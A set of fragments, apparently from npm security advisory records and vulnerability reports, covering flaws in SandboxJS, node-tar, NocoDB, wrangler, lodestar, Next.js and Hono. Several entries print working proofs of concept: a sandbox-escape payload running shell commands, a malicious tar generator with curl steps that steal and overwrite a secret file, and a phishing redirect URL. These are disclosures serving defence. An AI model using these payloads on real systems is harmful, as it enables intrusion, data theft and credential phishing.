});\n    }\n  });\n});\n```\n\n#### Example: Using invalid_elements\n```js\ninvalid_elements: 'iframe,object,embed'\n```\n\n### Acknowledgements\nTiny Technologies would like to thank Aaron Bishop at SecurityMetrics for discovering this vulnerability.\n\n### References\nhttps://www.tiny.cloud/docs/release-notes/release-notes56/#securityfixes\n\n### For more information\nIf

You should be able to completely fix the race conditions by leveraging SQLITE write lock and just send one query.\n\n### Summary\nThe /get-patch endpoint processes a purchase in two separate database queries: a SELECT that verifies the token is unused, followed by an UPDATE that marks the token as used. Because SQLite only guards each statement, a malicious actor can issue two requests at the exact same moment and have both SELECT statements succeed before either UPDATE runs.\n\n### Details\n\nThe handler executes (step 1):\n\n```\nSELECT id, token_used_at FROM purchases WHERE patch_id = ? AND purchase_token = ? AND status = 'COMPLETED'\n```\n\nIf token_used_at IS NULL, the request passes the check (step 2): \n```\n        if (row.token_used_at) {\n            return res.status(403).json({ error: \"Purchase token has already been used.\" });\n        }\n```\n\n\nThe handler finally runs (step 3):\n\n```\nUPDATE purchases SET token_used_at = CURRENT_TIMESTAMP WHERE id = ?\n```\n\n\nWhen two requests arrive at the same time, they both finish step 1 while the row is still unused. SQLite serializes writers only per statement, so each request believes it has exclusive access.

This encoding type MUST be supported by all clients.\n```\n\nIn snappy framing format there a few types of chunks.\nWe are interested in so called reserved skippable chunks. These are chunks with chunk type in range [0x80, 0xfd]\nLet's see how rust snappy handles them https://github.com/BurntSushi/rust-snappy/blob/master/src/read.rs#L137\n\n```\nimpl<R: io::Read> io::Read for FrameDecoder<R> {\n    fn read(&mut self, buf: &mut [u8]) -> io::Result<usize> {\n \t\t   ... \n           ...\n  \t\t    let len = len64 as usize;\n            match ty {\n                Err(b) if 0x02 <= b && b <= 0x7F => {\n                    // Spec says that chunk types 0x02-0x7F are reserved and\n                    // conformant decoders must return an error.\n                    fail!(Error::UnsupportedChunkType { byte: b });\n                }\n                Err(b) if 0x80 <= b && b <= 0xFD => {\n                    // Spec says that chunk types 0x80-0xFD are reserved but\n                    // skippable.\n                    self.r.read_exact(&mut self.src[0..len])?;\n                }\n```\n\nSimilar code can be found in golang implementation - https://github.com/golang/snappy/blob/master/decode.go#L221\n\n```\nfunc (r *Reader) fill() error {\n\t...\n\tif chunkType <= 0x7f {\n\t\t\t// Section 4.5.

https://github.com/ChainSafe/lodestar/blob/unstable/packages/reqresp/src/encodingStrategies/sszSnappy/snappyFrames/uncompress.ts#L17\n\n```\nuncompress(chunk: Uint8ArrayList): Uint8ArrayList | null

this.buffer.subarray(4, 4 + frameSize);\n      this.buffer.consume(4 + frameSize);\n\n      if (!this.state.foundIdentifier && type !== ChunkType.IDENTIFIER) {\n        throw \"malformed input: must

Error(\"Unsupported snappy chunk type\");\n  }\n```\n\nAs you can see, lodestar does not recognize such chunks.\n\nIf it sees such chunk, function getChunkType() throws an exception and decoding fails.\n\n### Impact Details\n\nFaulty nodes may trigger chain stall by sending messages which lodestar fails to parse, while other clients will be able to handle.\n\n### Proof of Concept\n\nHow to reproduce:\n\n1. get archive (via provided [gist link](https://gist.github.com/gln7/bdde7f4e0bdf9d47bf810a015796867a)), decode and unpack it:\n```\n$ base64 -d poc.txt > poc.tgz\n$ tar zxf poc.tgz\n```\n\n2. run dec1.go to verify that our snappy file decompressed successfully\n```\n$ go run dec1.go\n\nreading 1.snappy...\nread 124 bytes, err <nil>\n```\n\n3. run dec1.mjs to verify that lodestar fails to decode such file\n```\nchecking chunk type=255\nchecking chunk type=1\ngot uncompressed chunk..\nchecking chunk type=129\nfile:///../poc/dec1.mjs:74\n            throw new

This is handled in `utils.ts` by mapping `Function` to `sandboxFunction` within a map used for lookups.\n\nHowever, the library did not include mappings for `AsyncFunction`, `GeneratorFunction`, and `AsyncGeneratorFunction`. These constructors are not global properties but can be accessed via the `.constructor` property of an instance (e.g., `(async () => {}).constructor`).\n\nIn `executor.ts`, property access is handled. When code running inside the sandbox accesses `.constructor` on an async function (which the sandbox allows creating), the `executor` retrieves the property value. Since `AsyncFunction` was not in the safe-replacement map, the `executor` returns the actual native host `AsyncFunction` constructor.\n\nConstructors for functions in JavaScript (like `Function`, `AsyncFunction`) create functions that execute in the global scope. By obtaining the host `AsyncFunction` constructor, an attacker can create a new async function that executes entirely outside the sandbox context, bypassing all restrictions and gaining full access to the host environment (Remote Code Execution).\n\n### PoC\n\n```js\nconst sandbox = require('@nyariv/sandboxjs');\nconst s = new sandbox.default();\n\nconst payload = `\n    const af = async () => {};\n    // .constructor returns the host AsyncFunction constructor because it's not intercepted\n    const AsyncConstructor = af.constructor;\n    console.log(\"AsyncConstructor name:\", AsyncConstructor.name);\n    \n    // Create a function that executes outside the sandbox\n    const func = AsyncConstructor(\"return process.mainModule.require('child_process').execSync('id').toString()\");\n    \n    // Execute RCE\n    const p = func();\n    p.then(proc => {\n        console.log(proc);\n    });\n`;\n\ntry {\n    s.compile(payload)().run();\n} catch (e) {\n    console.error(\"Bypass failed:\", e.message);\n}\n```\n\nRun above script in nodejs.

This link is maintained to preserve external references.\n\n## Original Description\n\nSummaryA command injection vulnerability (CWE-78) has been found to exist in the `wrangler pages deploy` command. The issue occurs because the `--commit-hash` parameter is passed directly to a shell command without proper validation or sanitization, allowing an attacker with control of `--commit-hash` to execute arbitrary commands on the system running Wrangler.\n\n\n\n\nRoot causeThe commitHash variable, derived from user input via the --commit-hash CLI argument, is interpolated directly into a shell command using template literals (e.g.,  execSync(`git show -s --format=%B ${commitHash}`)). Shell metacharacters are interpreted by the shell, enabling command execution.\n\n\n\n\nImpactThis vulnerability is generally hard to exploit, as it requires --commit-hash to be attacker controlled. The vulnerability primarily affects CI/CD environments where `wrangler pages deploy` is used in automated pipelines and the \n\n--commit-hash parameter is populated from external, potentially untrusted sources.

Due to overly permissive MIME type checks and a lack of content sanitization, SVG files containing executable JavaScript are incorrectly treated as safe image content and rendered directly in the browser.\n\n### Root Cause\n\nThe vulnerability results from a combination of **overly permissive MIME type classification** and **unsafe file serving behavior**.\n\n#### 1. Permissive MIME Type Check\n\nIn `attachmentHelpers.ts`, files are considered previewable if their MIME type contains certain substrings:\n\n```ts\nconst previewableMimeTypes = ['image', 'pdf', 'video', 'audio'];\n\nexport const isPreviewAllowed = (args: { mimetype?: string } = {}) => {\n  const { mimetype } = args;\n  if (!mimetype) return false;\n  return previewableMimeTypes.some((type) => mimetype.includes(type));\n};\n```\n\nThis substring-based check (`includes`) causes files with the MIME type `image/svg+xml` to be classified as safe for inline preview. However, SVG is an XML-based format that supports executable JavaScript via `<script>` elements, event handlers, and external references.\n\nNo additional validation or sanitization is performed on SVG content after this classification.\n\n#### 2. Unsafe Inline File Serving\n\nUploaded attachments are served by the `fileReadv3` endpoint in `attachments.controller.ts` without sanitization or content-type enforcement:\n\n```ts\n@Get('/dltemp/:param(*)')\nasync fileReadv3(@Param('param') param: string, @Res() res: Response) {\n  // No authentication guard\n\n  // Sets headers from query parameters\n  res.setHeader('Content-Type', queryParams.contentType);\n  res.setHeader('Content-Disposition', queryParams.contentDisposition);\n\n  // Sends raw file content\n  res.sendFile(file.path);\n}\n```\n\nThe endpoint:\n\n* Preserves the original `Content-Type` (`image/svg+xml`)\n* Uses `Content-Disposition: inline`\n* Sends the raw file contents unmodified\n\nAs a result, browsers render the SVG inline and execute any embedded JavaScript under the NocoDB application’s origin.\n\n---\n\n## Impact\n\nThis is a **stored XSS** vulnerability that can be exploited by authenticated users with permission to upload attachments.\n\nPotential impacts include:\n\n* Account takeover\n* Theft of session cookies or API tokens\n* Unauthorized actions performed on behalf of victims\n* Privilege escalation if higher-privileged users view the malicious attachment\n\n---\n\n## Credit\n\nThis issue was discovered by an AI agent developed by the GitHub Security Lab and reviewed by GHSL team members @p- (Peter Stöckli) and @m-y-mo (Man Yue Mo).","affected":[{"package":{"name":"nocodb","ecosystem":"npm","purl":"pkg:npm/nocodb"},"ranges":[{"type":"SEMVER","events":[{"introduced":"0"},{"fixed":"0.301.0"}]}],"database_specific":{"source":"https://github.com/github/advisory-database/blob/main/advisories/github-reviewed/2026/01/GHSA-q5c6-h22r-qpwr/GHSA-q5c6-h22r-qpwr.json"}}],"references":[{"type":"WEB","url":"https://github.com/nocodb/nocodb/security/advisories/GHSA-q5c6-h22r-qpwr"},{"type":"ADVISORY","url":"https://nvd.nist.gov/vuln/detail/CVE-2026-24769"},{"type":"PACKAGE","url":"https://github.com/nocodb/nocodb"}],"database_specific":{"cwe_ids":["CWE-434","CWE-79"],"github_reviewed":true,"github_reviewed_at":"2026-01-28T21:41:03Z","nvd_published_at":"2026-01-28T21:16:12Z","severity":"HIGH"},"severity":[{"type":"CVSS_V4","score":"CVSS:4.0/AV:N/AC:L/AT:N/PR:L/UI:P/VC:H/VI:H/VA:H/SC:H/SI:H/SA:H/E:P"}],"_metadata":{"fetched_at":"2026-01-29T06:38:08.255423Z","source":"npm","ecosystem":"npm"}},{"schema_version":"1.7.3","id":"GHSA-3hmw-8mw3-rmpj","published":"2026-01-28T21:41:10Z","modified":"2026-01-28T21:56:23.853987Z","aliases":["CVE-2026-24768"],"summary":"NocoDB has Unvalidated Redirect in Login Flow via continueAfterSignIn Parameter","details":"### Summary\n\nAn **unvalidated redirect (open redirect)** vulnerability exists in NocoDB’s login flow due to missing validation of the `continueAfterSignIn` parameter.\n\nDuring authentication, NocoDB processes a user-controlled redirect value and conditionally performs client-side navigation without enforcing any restrictions on the destination’s origin, domain or protocol. This allows attackers to redirect authenticated users to arbitrary external websites after login.\n\n### Root Cause\n\nThe redirect logic relies on a permissive URL check that treats any absolute or protocol-relative URL as safe, and performs navigation without applying an allowlist or origin validation.\n\nIn the redirect plugin:\n\n* The helper function `isFullUrl` uses the following regular expression:\n\n  ```ts\n  /^(https?:)?\\/\\//\n  ```\n\n  This pattern matches any HTTP(S) URL as well as protocol-relative URLs (e.g., `//evil.example`), without restricting allowed domains.\n\n* When the `continueAfterSignIn` query parameter matches this pattern, the application performs an unconditional external navigation:\n\n  ```ts\n  navigateTo(route.value.query.continueAfterSignIn as string, {\n    external: isFullUrl(...)\n  })\n  ```\n\n### Attack Scenario\n\nAn attacker can exploit this issue through a phishing attack:\n\n1. The attacker crafts a malicious login URL containing a controlled redirect target, for example:\n\n   ```\n   https://victim-nocodb.example/#/signin?continueAfterSignIn=https://evil-phishing.com/fake-login\n   ```\n2.

After login, NocoDB automatically redirects the victim to the attacker-controlled external site.\n5. The attacker’s site displays a fake error message and prompts the victim to re-enter credentials.\n6. The victim unknowingly submits credentials to the attacker.\n\n### Impact\n\nThis vulnerability enables **phishing attacks** by leveraging user trust in the legitimate NocoDB login flow. While it does not directly expose credentials or bypass authentication, it increases the likelihood of credential theft through social engineering.\n\nThe issue does not allow arbitrary code execution or privilege escalation, but it undermines authentication integrity.\n\n### Credit\n\nThis issue was discovered by an AI agent developed by the GitHub Security Lab and reviewed by GHSL team members [@p- (Peter Stöckli)](https://github.com/p-) and [@m-y-mo (Man Yue Mo)](https://github.com/m-y-mo).","affected":[{"package":{"name":"nocodb","ecosystem":"npm","purl":"pkg:npm/nocodb"},"ranges":[{"type":"SEMVER","events":[{"introduced":"0"},{"fixed":"0.301.0"}]}],"database_specific":{"source":"https://github.com/github/advisory-database/blob/main/advisories/github-reviewed/2026/01/GHSA-3hmw-8mw3-rmpj/GHSA-3hmw-8mw3-rmpj.json"}}],"references":[{"type":"WEB","url":"https://github.com/nocodb/nocodb/security/advisories/GHSA-3hmw-8mw3-rmpj"},{"type":"ADVISORY","url":"https://nvd.nist.gov/vuln/detail/CVE-2026-24768"},{"type":"PACKAGE","url":"https://github.com/nocodb/nocodb"}],"database_specific":{"cwe_ids":["CWE-601"],"github_reviewed":true,"github_reviewed_at":"2026-01-28T21:41:10Z","nvd_published_at":"2026-01-28T21:16:12Z","severity":"MODERATE"},"severity":[{"type":"CVSS_V4","score":"CVSS:4.0/AV:N/AC:L/AT:N/PR:L/UI:N/VC:N/VI:H/VA:N/SC:N/SI:N/SA:N/E:P"}],"_metadata":{"fetched_at":"2026-01-29T06:38:08.100778Z","source":"npm","ecosystem":"npm"}},{"schema_version":"1.7.3","id":"GHSA-95ff-46g6-6gw9","published":"2026-01-28T21:41:26Z","modified":"2026-01-28T21:56:23.774765Z","aliases":["CVE-2026-24766"],"summary":"NocoDB has Prototype Pollution in Connection Test Endpoint, Leading to DoS","details":"### Summary\n\nAn authenticated user with org-level-creator permissions can exploit prototype pollution in the `/api/v2/meta/connection/test` endpoint, causing all database write operations to fail application-wide until server restart.\n\nWhile the pollution technically bypasses SUPER_ADMIN authorization checks, no practical privileged actions can be performed because database operations fail immediately after pollution.\n\n### Details\n\nThe `deepMerge()` function in `packages/nocodb/src/utils/dataUtils.ts` does not sanitize the following keys: (`__proto__`, `constructor`, `prototype`):\n\n```typescript\nexport const deepMerge = (target: any, ...sources: any[]) => {\n  // ...\n  Object.keys(source).forEach((key) => {\n    if (isMergeableObject(source[key])) {\n      if (!target[key]) target[key] = Array.isArray(source[key]) ?

This mismatch allows an attacker to craft a malicious TAR archive that bypasses path traversal protections and creates hardlinks to arbitrary files outside the extraction directory.\n\n### Details\nThe vulnerability exists in `lib/unpack.js`. When extracting a hardlink, two functions handle the linkpath differently:\n\n**Security check in `[STRIPABSOLUTEPATH]`:**\n```javascript\nconst entryDir = path.posix.dirname(entry.path);\nconst resolved = path.posix.normalize(path.posix.join(entryDir, linkpath));\nif (resolved.startsWith('../')) { /* block */ }\n```\n\n**Hardlink creation in `[HARDLINK]`:**\n```javascript\nconst linkpath = path.resolve(this.cwd, entry.linkpath);\nfs.linkSync(linkpath, dest);\n```\n\n**Example:** An application extracts a TAR using `tar.extract({ cwd: '/var/app/uploads/' })`. The TAR contains entry `a/b/c/d/x` as a hardlink to `../../../../etc/passwd`.\n\n- **Security check** resolves the linkpath relative to the entry's parent directory: `a/b/c/d/ + ../../../../etc/passwd` = `etc/passwd`. No `../` prefix, so it **passes**.\n\n- **Hardlink creation** resolves the linkpath relative to the extraction directory (`this.cwd`): `/var/app/uploads/ + ../../../../etc/passwd` = `/etc/passwd`. This **escapes** to the system's `/etc/passwd`.\n\nThe security check and hardlink creation use different starting points (entry directory `a/b/c/d/` vs extraction directory `/var/app/uploads/`), so the same linkpath can pass validation but still escape. The deeper the entry path, the more levels an attacker can escape.\n\n### PoC\n#### Setup\n\nCreate a new directory with these files:\n\n```\npoc/\n├── package.json\n├── secret.txt          ← sensitive file (target)\n├── server.js           ← vulnerable server\n├── create-malicious-tar.js\n├── verify.js\n└── uploads/            ← created automatically by server.js\n    └── (extracted files go here)\n```\n\n**package.json**\n```json\n{ \"dependencies\": { \"tar\": \"^7.5.0\" } }\n```\n\n**secret.txt** (sensitive file outside uploads/)\n```\nDATABASE_PASSWORD=supersecret123\n```\n\n**server.js** (vulnerable file upload server)\n```javascript\nconst http = require('http');\nconst fs = require('fs');\nconst path = require('path');\nconst tar = require('tar');\n\nconst PORT = 3000;\nconst UPLOAD_DIR = path.join(__dirname, 'uploads');\nfs.mkdirSync(UPLOAD_DIR, { recursive: true });\n\nhttp.createServer((req, res) => {\n  if (req.method === 'POST' && req.url === '/upload') {\n    const chunks = [];\n    req.on('data', c => chunks.push(c));\n    req.on('end', async () => {\n      fs.writeFileSync(path.join(UPLOAD_DIR, 'upload.tar'), Buffer.concat(chunks));\n      await tar.extract({ file: path.join(UPLOAD_DIR, 'upload.tar'), cwd: UPLOAD_DIR });\n      res.end('Extracted\\n');\n    });\n  } else if (req.method === 'GET' && req.url === '/read') {\n    // Simulates app serving extracted files (e.g., file download, static assets)\n    const targetPath = path.join(UPLOAD_DIR, 'd', 'x');\n    if (fs.existsSync(targetPath)) {\n      res.end(fs.readFileSync(targetPath));\n    } else {\n      res.end('File not found\\n');\n    }\n  } else if (req.method === 'POST' && req.url === '/write') {\n    // Simulates app writing to extracted file (e.g., config update, log append)\n    const chunks = [];\n    req.on('data', c => chunks.push(c));\n    req.on('end', () => {\n      const targetPath = path.join(UPLOAD_DIR, 'd', 'x');\n      if (fs.existsSync(targetPath)) {\n        fs.writeFileSync(targetPath, Buffer.concat(chunks));\n        res.end('Written\\n');\n      } else {\n        res.end('File not found\\n');\n      }\n    });\n  } else {\n    res.end('POST /upload, GET /read, or POST /write\\n');\n  }\n}).listen(PORT, () => console.log(`http://localhost:${PORT}`));\n```\n\n**create-malicious-tar.js** (attacker creates exploit TAR)\n```javascript\nconst fs = require('fs');\n\nfunction tarHeader(name, type, linkpath = '', size = 0) {\n  const b = Buffer.alloc(512, 0);\n  b.write(name, 0); b.write('0000644', 100); b.write('0000000', 108);\n  b.write('0000000', 116); b.write(size.toString(8).padStart(11, '0'), 124);\n  b.write(Math.floor(Date.now()/1000).toString(8).padStart(11, '0'), 136);\n  b.write('        ', 148);\n  b[156] = type === 'dir' ? 53 : type === 'link' ? 49 : 48;\n  if (linkpath) b.write(linkpath, 157);\n  b.write('ustar\\x00', 257); b.write('00', 263);\n  let sum = 0; for (let i = 0; i < 512; i++) sum += b[i];\n  b.write(sum.toString(8).padStart(6, '0') + '\\x00 ', 148);\n  return b;\n}\n\n// Hardlink escapes to parent directory's secret.txt\nfs.writeFileSync('malicious.tar', Buffer.concat([\n  tarHeader('d/', 'dir'),\n  tarHeader('d/x', 'link', '../secret.txt'),\n  Buffer.alloc(1024)\n]));\nconsole.log('Created malicious.tar');\n```\n\n#### Run\n\n```bash\n# Setup\nnpm install\necho \"DATABASE_PASSWORD=supersecret123\" > secret.txt\n\n# Terminal 1: Start server\nnode server.js\n\n# Terminal 2: Execute attack\nnode create-malicious-tar.js\ncurl -X POST --data-binary @malicious.tar http://localhost:3000/upload\n\n# READ ATTACK: Steal secret.txt content via the hardlink\ncurl http://localhost:3000/read\n# Returns: DATABASE_PASSWORD=supersecret123\n\n# WRITE ATTACK: Overwrite secret.txt through the hardlink\ncurl -X POST -d \"PWNED\" http://localhost:3000/write\n\n# Confirm secret.txt was modified\ncat secret.txt\n```\n### Impact\n\nAn attacker can craft a malicious TAR archive that, when extracted by an application using node-tar, creates hardlinks that escape the extraction directory.

The PPR resume endpoint accepts unauthenticated POST requests with the `Next-Resume: 1` header and processes attacker-controlled postponed state data. Two closely related vulnerabilities allow an attacker to crash the server process through memory exhaustion:\n\n1. **Unbounded request body buffering**: The server buffers the entire POST request body into memory using `Buffer.concat()` without enforcing any size limit, allowing arbitrarily large payloads to exhaust available memory.\n\n2. **Unbounded decompression (zipbomb)**: The resume data cache is decompressed using `inflateSync()` without limiting the decompressed output size. A small compressed payload can expand to hundreds of megabytes or gigabytes, causing memory exhaustion.\n\nBoth attack vectors result in a fatal V8 out-of-memory error (`FATAL ERROR: Reached heap limit Allocation failed - JavaScript heap out of memory`) causing the Node.js process to terminate. The zipbomb variant is particularly dangerous as it can bypass reverse proxy request size limits while still causing large memory allocation on the server.\n\nTo be affected, an application must run with `experimental.ppr: true` or `cacheComponents: true` configured along with the NEXT_PRIVATE_MINIMAL_MODE=1 environment variable.\n\nStrongly consider upgrading to 15.6.0-canary.61 or 16.1.5 to reduce risk and prevent availability issues in Next applications.","affected":[{"package":{"name":"next","ecosystem":"npm","purl":"pkg:npm/next"},"ranges":[{"type":"SEMVER","events":[{"introduced":"15.0.0-canary.0"},{"fixed":"15.6.0-canary.61"}]}],"database_specific":{"source":"https://github.com/github/advisory-database/blob/main/advisories/github-reviewed/2026/01/GHSA-5f7q-jpqc-wp7h/GHSA-5f7q-jpqc-wp7h.json"}},{"package":{"name":"next","ecosystem":"npm","purl":"pkg:npm/next"},"ranges":[{"type":"SEMVER","events":[{"introduced":"16.0.0-beta.0"},{"fixed":"16.1.5"}]}],"database_specific":{"source":"https://github.com/github/advisory-database/blob/main/advisories/github-reviewed/2026/01/GHSA-5f7q-jpqc-wp7h/GHSA-5f7q-jpqc-wp7h.json"}}],"references":[{"type":"WEB","url":"https://github.com/vercel/next.js/security/advisories/GHSA-5f7q-jpqc-wp7h"},{"type":"ADVISORY","url":"https://nvd.nist.gov/vuln/detail/CVE-2025-59472"},{"type":"PACKAGE","url":"https://github.com/vercel/next.js"},{"type":"WEB","url":"https://vercel.com/changelog/summaries-of-cve-2025-59471-and-cve-2025-59472"}],"database_specific":{"cwe_ids":["CWE-400","CWE-409","CWE-770"],"github_reviewed":true,"github_reviewed_at":"2026-01-28T15:20:55Z","nvd_published_at":"2026-01-26T22:15:53Z","severity":"MODERATE"},"severity":[{"type":"CVSS_V3","score":"CVSS:3.1/AV:N/AC:H/PR:N/UI:N/S:U/C:N/I:N/A:H"}],"_metadata":{"fetched_at":"2026-01-29T06:38:08.125520Z","source":"npm","ecosystem":"npm"}},{"schema_version":"1.7.3","id":"MAL-2026-583","published":"2026-01-28T13:59:24Z","modified":"2026-01-28T14:41:17.285518Z","aliases":["GHSA-343p-7f7g-4fc5"],"summary":"Malicious code in vuejavascript (npm)","details":"\n---\n_-= Per source details.

The middleware does not respect standard cache control headers such as `Cache-Control: private` or `Cache-Control: no-store`, which may result in private or authenticated responses being cached and subsequently exposed to unauthorized users.\n\n## Details\n\nThe vulnerability exists in the cache decision logic of Cache Middleware. When determining whether a response should be cached, the middleware does not take HTTP cache control semantics into account and may cache responses that are explicitly marked as private by the application. While some runtimes, such as Cloudflare Workers, enforce cache control restrictions at the platform level, other runtimes including Deno, Bun, and Node.js rely on the middleware’s behavior. As a result, applications running on these runtimes may unintentionally cache sensitive responses.\n\n## Impact\n\nThis issue can lead to Web Cache Deception and information disclosure. If an authenticated user accesses an endpoint that returns user-specific or sensitive data and the response is cached despite being marked as private, subsequent unauthenticated requests may receive the cached response. This may result in the exposure of personally identifiable information or session-related data. The impact is limited to applications that use the hono/cache middleware and rely on it to correctly honor HTTP cache control directives.\n\n## Affected Components\n\n* Cache Middleware","affected":[{"package":{"name":"hono","ecosystem":"npm","purl":"pkg:npm/hono"},"ranges":[{"type":"SEMVER","events":[{"introduced":"0"},{"fixed":"4.11.7"}]}],"database_specific":{"source":"https://github.com/github/advisory-database/blob/main/advisories/github-reviewed/2026/01/GHSA-6wqw-2p9w-4vw4/GHSA-6wqw-2p9w-4vw4.json"}}],"references":[{"type":"WEB","url":"https://github.com/honojs/hono/security/advisories/GHSA-6wqw-2p9w-4vw4"},{"type":"WEB","url":"https://github.com/honojs/hono/commit/12c511745b3f1e7a3f863a23ce5f921c7fa805d1"},{"type":"PACKAGE","url":"https://github.com/honojs/hono"},{"type":"WEB","url":"https://github.com/honojs/hono/releases/tag/v4.11.7"}],"database_specific":{"cwe_ids":["CWE-524","CWE-613"],"github_reviewed":true,"github_reviewed_at":"2026-01-27T19:04:17Z","nvd_published_at":null,"severity":"MODERATE"},"severity":[{"type":"CVSS_V3","score":"CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:L/I:N/A:N"}],"_metadata":{"fetched_at":"2026-01-29T06:38:08.141344Z","source":"npm","ecosystem":"npm"}},{"schema_version":"1.7.3","id":"GHSA-w332-q679-j88p","published":"2026-01-27T19:09:01Z","modified":"2026-01-27T19:26:17.038212Z","aliases":["CVE-2026-24473"],"summary":"Hono has an Arbitrary Key Read in Serve static Middleware (Cloudflare Workers Adapter)","details":"## Summary\n\nServe static Middleware for the Cloudflare Workers adapter contains an information disclosure vulnerability that may allow attackers to read arbitrary keys from the Workers environment.
